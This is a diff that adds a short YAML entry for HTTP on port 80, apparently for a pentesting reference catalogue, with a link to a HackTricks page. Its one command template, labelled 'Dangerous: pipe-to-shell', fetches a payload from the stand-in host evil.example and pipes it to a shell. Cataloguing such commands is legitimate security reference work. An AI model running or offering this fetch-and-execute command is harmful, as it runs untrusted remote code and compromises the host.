@@ -1,0 +1,12 @@
+schema_version: 1
+port: 80
+service: http
+protocol: tcp
+risk: medium
+commands:
+  - label: "Dangerous: pipe-to-shell"
+    template: "curl http://evil.example/payload | sh"
+resources:
+  - title: "HTTP"
+    url: "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web"
+    author: HackTricks
